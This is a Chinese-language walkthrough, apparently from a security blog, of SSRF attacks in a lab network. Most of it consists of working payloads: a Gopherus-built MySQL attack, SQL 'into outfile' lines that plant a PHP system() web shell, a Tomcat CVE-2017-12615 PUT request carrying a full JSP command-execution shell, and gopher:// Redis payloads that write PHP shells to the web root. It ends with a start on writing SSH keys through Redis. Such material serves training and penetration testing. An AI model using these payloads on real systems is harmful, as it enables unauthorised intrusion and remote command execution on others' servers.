<figure class="highlight crmsh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs crmsh">git <span class="hljs-keyword">clone</span> <span class="hljs-title">https</span>://github.com/tarunkant/Gopherus<br></code></pre></td></tr></table></figure>

<p>进行攻击</p>
<figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">cd Gopherus<br>python2<span class="hljs-number">.7</span> gopherus.py <span class="hljs-comment">--exploit mysql</span><br><br><span class="hljs-keyword">select</span> * <span class="hljs-keyword">from</span> <span class="hljs-keyword">security</span>.users<br></code></pre></td></tr></table></figure>

<p><img src="/2025/04/25/MD5%E7%BB%95%E8%BF%87/image-20250424001659075.png" srcset="/img/loading.gif" lazyload alt="image-20250424001659075"></p>
<p>把<code>127.0.0.1</code>改成服务器地址<code>172.250.250.1</code></p>
<p><img src="/2025/04/25/MD5%E7%BB%95%E8%BF%87/image-20250423233735101.png" srcset="/img/loading.gif" lazyload alt="image-20250423233735101"></p>
<h3 id="使用SSRF对MySQL进行未授权文件写入"><a href="#使用SSRF对MySQL进行未授权文件写入" class="headerlink" title="使用SSRF对MySQL进行未授权文件写入"></a>使用SSRF对MySQL进行未授权文件写入</h3><p>查看写入权限</p>
<figure class="highlight gams"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gams">show <span class="hljs-keyword">variables</span> like <span class="hljs-comment">&#x27;%secure%&#x27;</span><br></code></pre></td></tr></table></figure>

<p><img src="/2025/04/25/MD5%E7%BB%95%E8%BF%87/image-20250423235910306.png" srcset="/img/loading.gif" lazyload alt="image-20250423235910306"></p>
<p><img src="/2025/04/25/MD5%E7%BB%95%E8%BF%87/image-20250424000044507.png" srcset="/img/loading.gif" lazyload alt="image-20250424000044507"></p>
<p>查看源码，会发现下面<code>secure_file_priv</code>这里没有值，就有写入权限</p>
<p><img src="/2025/04/25/MD5%E7%BB%95%E8%BF%87/image-20250424000201569.png" srcset="/img/loading.gif" lazyload alt="image-20250424000201569"></p>
<h4 id="使用工具构造payload-1"><a href="#使用工具构造payload-1" class="headerlink" title="使用工具构造payload"></a>使用工具构造payload</h4><p>使用<code>into outfile</code>生成文件<code>cmd.php</code>并写入一句话</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">select</span> &quot;&lt;?php system($_GET[&#x27;cmd&#x27;]);?&gt;&quot; <span class="hljs-keyword">into</span> outfile <span class="hljs-string">&#x27;/var/www/html/cmd.php&#x27;</span>;<br><br># 如果是宝塔搭建的<br><span class="hljs-keyword">select</span> &quot;&lt;?php system($_GET[&#x27;cmd&#x27;]);?&gt;&quot; <span class="hljs-keyword">into</span> outfile <span class="hljs-string">&#x27;/www/wwwroot/cmd.php&#x27;</span>;<br></code></pre></td></tr></table></figure>

<p><img src="/2025/04/25/MD5%E7%BB%95%E8%BF%87/image-20250424000628991.png" srcset="/img/loading.gif" lazyload alt="image-20250424000628991"></p>
<p><img src="/2025/04/25/MD5%E7%BB%95%E8%BF%87/image-20250424000850842.png" srcset="/img/loading.gif" lazyload alt="image-20250424000850842"></p>
<p>执行命令</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">http://172.250.250.1/cmd.php?cmd=<span class="hljs-built_in">ls</span><br></code></pre></td></tr></table></figure>

<p><img src="/2025/04/25/MD5%E7%BB%95%E8%BF%87/image-20250424001000102.png" srcset="/img/loading.gif" lazyload alt="image-20250424001000102"></p>
<h2 id="使用SSRF对tomcat文件写入"><a href="#使用SSRF对tomcat文件写入" class="headerlink" title="使用SSRF对tomcat文件写入"></a>使用SSRF对tomcat文件写入</h2><p>tomcat漏洞：CVE-2017-12615</p>
<p>这个漏洞的作用是任意文件上传，绕过验证直接在目标靶机进行文件上传</p>
<p>默认端口是8080</p>
<h3 id="要构造的POC"><a href="#要构造的POC" class="headerlink" title="要构造的POC"></a>要构造的POC</h3><p>头部信息</p>
<p><img src="/2025/04/25/MD5%E7%BB%95%E8%BF%87/image-20250424002709598.png" srcset="/img/loading.gif" lazyload alt="image-20250424002709598"></p>
<p>然后构造一句话木马填充到头部信息后</p>
<p><img src="/2025/04/25/MD5%E7%BB%95%E8%BF%87/image-20250424002759890.png" srcset="/img/loading.gif" lazyload alt="image-20250424002759890"></p>
<p>将以上两部分合并后进行URL编码提交</p>
<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">PUT</span> <span class="hljs-string">/cmd.jsp/</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>172.250.250.7:8080<br><span class="hljs-attribute">Accept</span><span class="hljs-punctuation">: </span>*/*<br><span class="hljs-attribute">Accept-Language</span><span class="hljs-punctuation">: </span>en<br><span class="hljs-attribute">User-Agent</span><span class="hljs-punctuation">: </span>Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)<br><span class="hljs-attribute">Connection</span><span class="hljs-punctuation">: </span>close<br><span class="hljs-attribute">Content-Type</span><span class="hljs-punctuation">: </span>application/x-www-form-urlencoded<br><span class="hljs-attribute">Content-Length</span><span class="hljs-punctuation">: </span>460<br><br><span class="language-gradle">&lt;%</span><br><span class="language-gradle">	String command = request.getParameter(<span class="hljs-string">&quot;cmd&quot;</span>);</span><br><span class="language-gradle">	<span class="hljs-keyword">if</span>(command != <span class="hljs-keyword">null</span>)</span><br><span class="language-gradle">	&#123;</span><br><span class="language-gradle">		java.io.InputStream in=<span class="hljs-keyword">Runtime</span>.getRuntime().exec(command).getInputStream();</span><br><span class="language-gradle">		<span class="hljs-keyword">int</span> a = -<span class="hljs-number">1</span>;</span><br><span class="language-gradle">		<span class="hljs-keyword">byte</span>[] b = <span class="hljs-keyword">new</span> <span class="hljs-keyword">byte</span>[<span class="hljs-number">2048</span>];</span><br><span class="language-gradle">		out.<span class="hljs-keyword">print</span>(<span class="hljs-string">&quot;&lt;pre&gt;&quot;</span>);</span><br><span class="language-gradle">		<span class="hljs-keyword">while</span>((a=in.<span class="hljs-keyword">read</span>(b))!=-<span class="hljs-number">1</span>)</span><br><span class="language-gradle">		&#123;</span><br><span class="language-gradle">			out.<span class="hljs-keyword">println</span>(<span class="hljs-keyword">new</span> String(b));</span><br><span class="language-gradle">		&#125;</span><br><span class="language-gradle">		out.<span class="hljs-keyword">print</span>(<span class="hljs-string">&quot;&lt;/pre&gt;&quot;</span>);</span><br><span class="language-gradle">	&#125; <span class="hljs-keyword">else</span> &#123;</span><br><span class="language-gradle">		out.<span class="hljs-keyword">print</span>(<span class="hljs-string">&quot;format: xxx.jsp?cmd=Command&quot;</span>);</span><br><span class="language-gradle">	&#125;</span><br><span class="language-gradle">%&gt;</span><br></code></pre></td></tr></table></figure>

<figure class="highlight dts"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dts"><span class="hljs-symbol">http:</span><span class="hljs-comment">//172.250.250.7:8080</span><br></code></pre></td></tr></table></figure>

<p><img src="/2025/04/25/MD5%E7%BB%95%E8%BF%87/image-20250424002953081.png" srcset="/img/loading.gif" lazyload alt="image-20250424002953081"></p>
<p>先提交<code>gopher</code>伪协议进行抓包</p>
<figure class="highlight dts"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dts"><span class="hljs-symbol">gopher:</span><span class="hljs-comment">//172.250.250.7:8080/_</span><br></code></pre></td></tr></table></figure>

<p>加入POC，进行两次URL编码</p>
<p><img src="/2025/04/25/MD5%E7%BB%95%E8%BF%87/image-20250424004605165.png" srcset="/img/loading.gif" lazyload alt="image-20250424004605165"></p>
<p><img src="/2025/04/25/MD5%E7%BB%95%E8%BF%87/image-20250424004643567.png" srcset="/img/loading.gif" lazyload alt="image-20250424004643567"></p>
<p>访问看看</p>
<figure class="highlight dts"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dts"><span class="hljs-symbol">http:</span><span class="hljs-comment">//172.250.250.7:8080/cmd.jsp</span><br></code></pre></td></tr></table></figure>

<p><img src="/2025/04/25/MD5%E7%BB%95%E8%BF%87/image-20250424004720696.png" srcset="/img/loading.gif" lazyload alt="image-20250424004720696"></p>
<p>可以看到成功了，可以执行命令</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">http://172.250.250.7:8080/cmd.jsp?cmd=<span class="hljs-built_in">ls</span><br></code></pre></td></tr></table></figure>

<p><img src="/2025/04/25/MD5%E7%BB%95%E8%BF%87/image-20250424004843016.png" srcset="/img/loading.gif" lazyload alt="image-20250424004843016"></p>
<h2 id="使用SSRF对Redis漏洞未授权操作"><a href="#使用SSRF对Redis漏洞未授权操作" class="headerlink" title="使用SSRF对Redis漏洞未授权操作"></a>使用SSRF对Redis漏洞未授权操作</h2><h3 id="使用SSRF对Redis未授权Webshell写入"><a href="#使用SSRF对Redis未授权Webshell写入" class="headerlink" title="使用SSRF对Redis未授权Webshell写入"></a>使用SSRF对Redis未授权<code>Webshell</code>写入</h3><p>如果对方服务器上有一个网站，可以使用Redis未授权，向对方网站的根目录下写入一个一句话木马，从而拿到对方的<code>Webshell</code></p>
<h4 id="利用逻辑"><a href="#利用逻辑" class="headerlink" title="利用逻辑"></a>利用逻辑</h4><p>通过备份<code>dbfilename</code>这个文件，将备份文件放在<code>/var/www/html/</code>这个路径下，并设置文件名为<code>phpinfo.php</code>，同时备份的数据写入<code>&lt;?php phpinfo();?&gt;</code>，最后保存退出</p>
<ul>
<li><strong>设置Web路径</strong></li>
</ul>
<figure class="highlight gams"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gams">config <span class="hljs-keyword">set</span> dir /var/<span class="hljs-comment">www</span>/html/<br></code></pre></td></tr></table></figure>

<ul>
<li><strong>设置shell文件名</strong></li>
</ul>
<figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs arduino">config set dbfilename phpinfo.php<br></code></pre></td></tr></table></figure>

<ul>
<li><strong>像数据库插入payload</strong></li>
</ul>
<figure class="highlight php-template"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php-template"><span class="language-xml">set payload &quot;</span><span class="language-php"><span class="hljs-meta">&lt;?php</span> <span class="hljs-title function_ invoke__">phpinfo</span>();<span class="hljs-meta">?&gt;</span></span><span class="language-xml">&quot;</span><br></code></pre></td></tr></table></figure>

<ul>
<li><strong>保存<code>Webshell</code></strong></li>
</ul>
<figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">save</span><br></code></pre></td></tr></table></figure>

<h4 id="本地抓包构造"><a href="#本地抓包构造" class="headerlink" title="本地抓包构造"></a>本地抓包构造</h4><p>抓包</p>
<figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mipsasm">tcpdump -i <span class="hljs-keyword">br-容器ID </span>tcp <span class="hljs-keyword">and </span>port <span class="hljs-number">6379</span> -w redis.pcapng<br></code></pre></td></tr></table></figure>

<p><img src="/2025/04/25/MD5%E7%BB%95%E8%BF%87/image-20250424145417317.png" srcset="/img/loading.gif" lazyload alt="image-20250424145417317"></p>
<p>用Redis-cli登录到主机内</p>
<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">redis</span>-cli -h <span class="hljs-number">172.250.250.9</span><br></code></pre></td></tr></table></figure>

<p>设置路径到网站的根目录</p>
<figure class="highlight gams"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gams">config <span class="hljs-keyword">set</span> dir /var/<span class="hljs-comment">www</span>/html/<br></code></pre></td></tr></table></figure>

<p>设置Web路径</p>
<figure class="highlight gams"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gams">config <span class="hljs-keyword">set</span> dir /var/<span class="hljs-comment">www</span>/html/<br></code></pre></td></tr></table></figure>

<p>设置shell文件名</p>
<figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs arduino">config set dbfilename info.php<br></code></pre></td></tr></table></figure>

<p>像数据库插入payload</p>
<figure class="highlight php-template"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php-template"><span class="language-xml">set payload &quot;</span><span class="language-php"><span class="hljs-meta">&lt;?php</span> <span class="hljs-title function_ invoke__">phpinfo</span>();<span class="hljs-meta">?&gt;</span></span><span class="language-xml">&quot;</span><br></code></pre></td></tr></table></figure>

<p>保存<code>Webshell</code></p>
<figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">save</span><br></code></pre></td></tr></table></figure>

<p>最后退出</p>
<figure class="highlight cos"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs cos"><span class="hljs-keyword">quit</span><br></code></pre></td></tr></table></figure>

<p><img src="/2025/04/25/MD5%E7%BB%95%E8%BF%87/image-20250424145835373.png" srcset="/img/loading.gif" lazyload alt="image-20250424145835373"></p>
<p>现在就拿到了完整的数据包，可以在根目录查看</p>
<p><img src="/2025/04/25/MD5%E7%BB%95%E8%BF%87/image-20250424150105087.png" srcset="/img/loading.gif" lazyload alt="image-20250424150105087"></p>
<p>将抓到的包用Wireshark打开</p>
<p><img src="/2025/04/25/MD5%E7%BB%95%E8%BF%87/image-20250424150311486.png" srcset="/img/loading.gif" lazyload alt="image-20250424150311486"></p>
<p>筛选器筛选出红色的部分</p>
<p><img src="/2025/04/25/MD5%E7%BB%95%E8%BF%87/image-20250424150432270.png" srcset="/img/loading.gif" lazyload alt="image-20250424150432270"></p>
<p>将数据复制出来，这是第一个命令的参数</p>
<p><img src="/2025/04/25/MD5%E7%BB%95%E8%BF%87/image-20250424151303007.png" srcset="/img/loading.gif" lazyload alt="image-20250424151303007"></p>
<p>构造payload时上面三行可删去</p>
<p><img src="/2025/04/25/MD5%E7%BB%95%E8%BF%87/image-20250424151340968.png" srcset="/img/loading.gif" lazyload alt="image-20250424151340968"></p>
<p>最后加上quit，payload如下</p>
<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-number">*4</span><br><span class="hljs-variable">$6</span><span class="hljs-built_in"></span><br><span class="hljs-built_in">CONFIG</span><br><span class="hljs-built_in"></span><span class="hljs-variable">$3</span><br><span class="hljs-built_in">SET</span><br><span class="hljs-variable">$3</span><br>dir<br><span class="hljs-variable">$14</span><br>/var/www/html<br><span class="hljs-number">*4</span><br><span class="hljs-variable">$6</span><span class="hljs-built_in"></span><br><span class="hljs-built_in">config</span><br><span class="hljs-built_in"></span><span class="hljs-variable">$3</span><br><span class="hljs-built_in">set</span><br><span class="hljs-variable">$10</span><br>dbfilename<br><span class="hljs-variable">$8</span><br>info.php<br><span class="hljs-number">*3</span><br><span class="hljs-variable">$3</span><br><span class="hljs-built_in">set</span><br><span class="hljs-variable">$7</span><br>payload<br><span class="hljs-variable">$19</span><br>&lt;?php phpinfo(); ?&gt;<br><span class="hljs-number">*1</span><br><span class="hljs-variable">$4</span><br>save<br><span class="hljs-number">*1</span><br><span class="hljs-variable">$4</span><br>quit<br></code></pre></td></tr></table></figure>

<p>首先使用<code>dict</code>伪协议检查网站的Redis是否在运行</p>
<figure class="highlight dts"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dts"><span class="hljs-symbol">dict:</span><span class="hljs-comment">//172.250.250.9:6379/info</span><br></code></pre></td></tr></table></figure>

<p>如果是未授权的就会弹出一堆信息</p>
<p><img src="/2025/04/25/MD5%E7%BB%95%E8%BF%87/image-20250424152302727.png" srcset="/img/loading.gif" lazyload alt="image-20250424152302727"></p>
<p>如果是要授权的就会弹出认证失败的信息</p>
<p>构造<code>gopher</code>伪协议的payload，首先将payload的换行符换成<code>%0d%0a</code>，问号换成<code>%3f</code></p>
<p><img src="/2025/04/25/MD5%E7%BB%95%E8%BF%87/image-20250424152643088.png" srcset="/img/loading.gif" lazyload alt="image-20250424152643088"></p>
<figure class="highlight mel"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mel">*<span class="hljs-number">4</span>%0d%0a$6%0d%0aCONFIG%0d%0a$3%0d%0aSET%0d%0a$3%0d%0adir%0d%0a$14%0d%0a/var/www/html%0d%0a*<span class="hljs-number">4</span>%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$10%0d%0adbfilename%0d%0a$8%0d%0ainfo.php%0d%0a*<span class="hljs-number">3</span>%0d%0a$3%0d%0aset%0d%0a$7%0d%0apayload%0d%0a$19%0d%0a&lt;%3fphp phpinfo(); %3f&gt;%0d%0a*<span class="hljs-number">1</span>%0d%0a$4%0d%0asave%0d%0a*<span class="hljs-number">1</span>%0d%0a$4%0d%0aquit<br></code></pre></td></tr></table></figure>

<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">gopher</span>://<span class="hljs-number">172.250.250.9:6379</span>/_*<span class="hljs-number">4</span>%<span class="hljs-number">0</span>d%<span class="hljs-number">0</span>a$<span class="hljs-number">6</span>%<span class="hljs-number">0</span>d%<span class="hljs-number">0</span>aCONFIG%<span class="hljs-number">0</span>d%<span class="hljs-number">0</span>a$<span class="hljs-number">3</span>%<span class="hljs-number">0</span>d%<span class="hljs-number">0</span>aSET%<span class="hljs-number">0</span>d%<span class="hljs-number">0</span>a$<span class="hljs-number">3</span>%<span class="hljs-number">0</span>d%<span class="hljs-number">0</span>adir%<span class="hljs-number">0</span>d%<span class="hljs-number">0</span>a$<span class="hljs-number">14</span>%<span class="hljs-number">0</span>d%<span class="hljs-number">0</span>a/var/www/html%<span class="hljs-number">0</span>d%<span class="hljs-number">0</span>a*<span class="hljs-number">4</span>%<span class="hljs-number">0</span>d%<span class="hljs-number">0</span>a$<span class="hljs-number">6</span>%<span class="hljs-number">0</span>d%<span class="hljs-number">0</span>aconfig%<span class="hljs-number">0</span>d%<span class="hljs-number">0</span>a$<span class="hljs-number">3</span>%<span class="hljs-number">0</span>d%<span class="hljs-number">0</span>aset%<span class="hljs-number">0</span>d%<span class="hljs-number">0</span>a$<span class="hljs-number">10</span>%<span class="hljs-number">0</span>d%<span class="hljs-number">0</span>adbfilename%<span class="hljs-number">0</span>d%<span class="hljs-number">0</span>a$<span class="hljs-number">8</span>%<span class="hljs-number">0</span>d%<span class="hljs-number">0</span>ainfo.php%<span class="hljs-number">0</span>d%<span class="hljs-number">0</span>a*<span class="hljs-number">3</span>%<span class="hljs-number">0</span>d%<span class="hljs-number">0</span>a$<span class="hljs-number">3</span>%<span class="hljs-number">0</span>d%<span class="hljs-number">0</span>aset%<span class="hljs-number">0</span>d%<span class="hljs-number">0</span>a$<span class="hljs-number">7</span>%<span class="hljs-number">0</span>d%<span class="hljs-number">0</span>apayload%<span class="hljs-number">0</span>d%<span class="hljs-number">0</span>a$<span class="hljs-number">19</span>%<span class="hljs-number">0</span>d%<span class="hljs-number">0</span>a&lt;%<span class="hljs-number">3</span>fphp phpinfo(); %<span class="hljs-number">3</span>f&gt;%<span class="hljs-number">0</span>d%<span class="hljs-number">0</span>a*<span class="hljs-number">1</span>%<span class="hljs-number">0</span>d%<span class="hljs-number">0</span>a$<span class="hljs-number">4</span>%<span class="hljs-number">0</span>d%<span class="hljs-number">0</span>asave%<span class="hljs-number">0</span>d%<span class="hljs-number">0</span>a*<span class="hljs-number">1</span>%<span class="hljs-number">0</span>d%<span class="hljs-number">0</span>a$<span class="hljs-number">4</span>%<span class="hljs-number">0</span>d%<span class="hljs-number">0</span>aquit<br></code></pre></td></tr></table></figure>

<p>提交</p>
<p><img src="/2025/04/25/MD5%E7%BB%95%E8%BF%87/image-20250424152948552.png" srcset="/img/loading.gif" lazyload alt="image-20250424152948552"></p>
<p>然后就可以使用<code>http</code>伪协议访问</p>
<figure class="highlight dts"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dts"><span class="hljs-symbol">http:</span><span class="hljs-comment">//172.250.250.9/info.php</span><br></code></pre></td></tr></table></figure>

<p><img src="/2025/04/25/MD5%E7%BB%95%E8%BF%87/image-20250424153547262.png" srcset="/img/loading.gif" lazyload alt="image-20250424153547262"></p>
<h4 id="使用工具构造"><a href="#使用工具构造" class="headerlink" title="使用工具构造"></a>使用工具构造</h4><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus">python2 gopherus<span class="hljs-selector-class">.py</span> <span class="hljs-attr">--exploit</span> redis<br></code></pre></td></tr></table></figure>

<p><img src="/2025/04/25/MD5%E7%BB%95%E8%BF%87/image-20250424153958769.png" srcset="/img/loading.gif" lazyload alt="image-20250424153958769"></p>
<p>有两个选项，第一个是反弹shell，第二个是PHP命令交互，这里选择第二个</p>
<figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">PHPShell</span><br></code></pre></td></tr></table></figure>

<p>网站根目录是否是<code>/var/www/html</code>，是就直接回车</p>
<p><img src="/2025/04/25/MD5%E7%BB%95%E8%BF%87/image-20250424154144576.png" srcset="/img/loading.gif" lazyload alt="image-20250424154144576"></p>
<p>然后是构造的payload，可以直接回车用默认的</p>
<p><img src="/2025/04/25/MD5%E7%BB%95%E8%BF%87/image-20250424154225610.png" srcset="/img/loading.gif" lazyload alt="image-20250424154225610"></p>
<p>会生成一个<code>shell.php</code>页面，GET方法提交<code>cmd</code>参数执行命令</p>
<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">gopher</span>://<span class="hljs-number">172.250.250.9:6379</span>/_%<span class="hljs-number">2</span>A1%<span class="hljs-number">0</span>D%<span class="hljs-number">0</span>A%<span class="hljs-number">248</span>%<span class="hljs-number">0</span>D%<span class="hljs-number">0</span>Aflushall%<span class="hljs-number">0</span>D%<span class="hljs-number">0</span>A%<span class="hljs-number">2</span>A3%<span class="hljs-number">0</span>D%<span class="hljs-number">0</span>A%<span class="hljs-number">243</span>%<span class="hljs-number">0</span>D%<span class="hljs-number">0</span>Aset%<span class="hljs-number">0</span>D%<span class="hljs-number">0</span>A%<span class="hljs-number">241</span>%<span class="hljs-number">0</span>D%<span class="hljs-number">0</span>A1%<span class="hljs-number">0</span>D%<span class="hljs-number">0</span>A%<span class="hljs-number">2434</span>%<span class="hljs-number">0</span>D%<span class="hljs-number">0</span>A%<span class="hljs-number">0</span>A%<span class="hljs-number">0</span>A%<span class="hljs-number">3</span>C%<span class="hljs-number">3</span>Fphp%<span class="hljs-number">20</span>system%<span class="hljs-number">28</span>%<span class="hljs-number">24</span>_GET%<span class="hljs-number">5</span>B%<span class="hljs-number">27</span>cmd%<span class="hljs-number">27</span>%<span class="hljs-number">5</span>D%<span class="hljs-number">29</span>%<span class="hljs-number">3</span>B%<span class="hljs-number">20</span>%<span class="hljs-number">3</span>F%<span class="hljs-number">3</span>E%<span class="hljs-number">0</span>A%<span class="hljs-number">0</span>A%<span class="hljs-number">0</span>D%<span class="hljs-number">0</span>A%<span class="hljs-number">2</span>A4%<span class="hljs-number">0</span>D%<span class="hljs-number">0</span>A%<span class="hljs-number">246</span>%<span class="hljs-number">0</span>D%<span class="hljs-number">0</span>Aconfig%<span class="hljs-number">0</span>D%<span class="hljs-number">0</span>A%<span class="hljs-number">243</span>%<span class="hljs-number">0</span>D%<span class="hljs-number">0</span>Aset%<span class="hljs-number">0</span>D%<span class="hljs-number">0</span>A%<span class="hljs-number">243</span>%<span class="hljs-number">0</span>D%<span class="hljs-number">0</span>Adir%<span class="hljs-number">0</span>D%<span class="hljs-number">0</span>A%<span class="hljs-number">2413</span>%<span class="hljs-number">0</span>D%<span class="hljs-number">0</span>A/var/www/html%<span class="hljs-number">0</span>D%<span class="hljs-number">0</span>A%<span class="hljs-number">2</span>A4%<span class="hljs-number">0</span>D%<span class="hljs-number">0</span>A%<span class="hljs-number">246</span>%<span class="hljs-number">0</span>D%<span class="hljs-number">0</span>Aconfig%<span class="hljs-number">0</span>D%<span class="hljs-number">0</span>A%<span class="hljs-number">243</span>%<span class="hljs-number">0</span>D%<span class="hljs-number">0</span>Aset%<span class="hljs-number">0</span>D%<span class="hljs-number">0</span>A%<span class="hljs-number">2410</span>%<span class="hljs-number">0</span>D%<span class="hljs-number">0</span>Adbfilename%<span class="hljs-number">0</span>D%<span class="hljs-number">0</span>A%<span class="hljs-number">249</span>%<span class="hljs-number">0</span>D%<span class="hljs-number">0</span>Ashell.php%<span class="hljs-number">0</span>D%<span class="hljs-number">0</span>A%<span class="hljs-number">2</span>A1%<span class="hljs-number">0</span>D%<span class="hljs-number">0</span>A%<span class="hljs-number">244</span>%<span class="hljs-number">0</span>D%<span class="hljs-number">0</span>Asave%<span class="hljs-number">0</span>D%<span class="hljs-number">0</span>A%<span class="hljs-number">0</span>A<br></code></pre></td></tr></table></figure>

<p><img src="/2025/04/25/MD5%E7%BB%95%E8%BF%87/image-20250424154505121.png" srcset="/img/loading.gif" lazyload alt="image-20250424154505121"></p>
<p>执行命令</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">http://172.250.250.9/shell.php?cmd=<span class="hljs-built_in">id</span><br></code></pre></td></tr></table></figure>

<p><img src="/2025/04/25/MD5%E7%BB%95%E8%BF%87/image-20250424154606727.png" srcset="/img/loading.gif" lazyload alt="image-20250424154606727"></p>
<h3 id="使用SSRF对Redis未授权SSH公钥写入"><a href="#使用SSRF对Redis未授权SSH公钥写入" class="headerlink" title="使用SSRF对Redis未授权SSH公钥写入"></a>使用SSRF对Redis未授权SSH公钥写入</h3><p>如果对方主机开启了SSH，可以尝试写入SSH公钥文件，用自己的私钥去连接，从而进行SSH登录</p>
<h4 id="在kali上生成私钥对"><a href="#在kali上生成私钥对" class="headerlink" title="在kali上生成私钥对"></a>在kali上生成私钥对</h4><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">ssh-keygen -t rsa</span><br></code></pre></td></tr></table></figure>

<p>会生成在<code>root</code>目录下的<code>.ssh</code>中，默认敲回车</p>
<p><img src="/2025/04/25/MD5%E7%BB%95%E8%BF%87/image-20250424161301409.png" srcset="/img/loading.gif" lazyload alt="image-20250424161301409"></p>
<p><img src="/2025/04/25/MD5%E7%BB%95%E8%BF%87/image-20250424161410956.png" srcset="/img/loading.gif" lazyload alt="image-20250424161410956"></p>
<p>第一个是私钥，第二个是公钥</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">cat</span> id_rsa.pub<br></code></pre></td></tr></table></figure>

<p><img src="/2025/04/25/MD5%E7%BB%95%E8%BF%87/image-20250424161513308.png" srcset="/img/loading.gif" lazyload alt="image-20250424161513308"></p>
<p>对之前的payload进行修改，要修改文件路径、文件名、文件内容，注意在构造payload时在前后都加上两个换行符，使其之后与其他内容进行区分开</p>
